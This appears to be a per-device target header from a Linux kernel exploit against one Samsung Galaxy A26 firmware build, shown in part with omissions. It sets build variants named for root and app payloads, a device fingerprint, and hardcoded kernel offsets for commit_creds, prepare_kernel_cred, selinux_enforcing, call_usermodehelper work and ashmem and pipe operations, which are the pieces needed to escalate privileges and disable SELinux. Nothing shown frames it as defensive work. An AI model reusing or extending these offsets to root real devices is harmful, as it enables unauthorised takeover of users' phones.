...
#define BUILD_VARIANT_LABEL "a266b-A266BXXU9CZEA-app"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "a266b-A266BXXU9CZEA-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
 "samsung/a26x/a26x:16/UP1A.231005.007/A266BXXU9CZEA:user/release-keys"
#endif
...
#define INIT_TASK_OFF             0x0228fd40ULL
#define PREPARE_KERNEL_CRED_OFF   0x00112d9cULL
#define COMMIT_CREDS_OFF          0x00112644ULL
#define OVERRIDE_CREDS_OFF        0x0011f1dcULL

#define ROOT_TASK_GROUP_OFF       0x02473f40ULL
#define SELINUX_ENFORCING_OFF     0x02a3c404ULL
#define KMALLOC_CACHES_OFF        0x01a2d370ULL
#define ANON_PIPE_BUF_OPS_OFF     0x0184b620ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x0227ae20ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00100200ULL

#define ASHMEM_FOPS_OFF           0x019dc2f0ULL
#define ASHMEM_MISC_FOPS_OFF      0x023e4200ULL
#define ASHMEM_IOCTL_OFF          0x00c63fc8ULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x00c64580ULL
#define ASHMEM_MMAP_OFF           0x00c645d8ULL
#define ASHMEM_OPEN_OFF           0x00c64814ULL
#define ASHMEM_RELEASE_OFF        0x00c64898ULL
#define ASHMEM_SHOW_FDINFO_OFF    0x00c649b8ULL

#define CONFIGFS_READ_ITER_OFF    0x00474910ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00474dccULL
#define COPY_SPLICE_READ_OFF      0x003fbbb0ULL
#define NOOP_LLSEEK_OFF           0x003b0d98ULL
...
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x022824b0ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02282590ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02627ac9ULL
#define SLIDE_SYSCTL_BOOTID_OFF 0x02627ac9ULL
...
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define KERNELSNITCH_VERBOSE 2
#define ROUTE_WAIT_SECONDS 60
...
#define P0_FINGERPRINT_HEADER "targets/a266b-A266BXXU9CZEA/p0_fingerprint.h"
#endif
